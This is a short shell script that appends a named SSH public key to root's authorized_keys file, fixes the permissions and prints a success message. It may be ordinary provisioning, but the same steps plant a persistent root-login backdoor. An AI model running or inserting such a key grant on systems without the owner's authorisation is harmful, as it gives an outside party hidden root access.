#!/bin/sh
mkdir -p /root/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG1xY4jY6M/12DeirBJrAmpaozvGvJmuhIQJDXA2nBkH oficina-acceso-20261028" >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
echo OK-LISTO-ACCESO
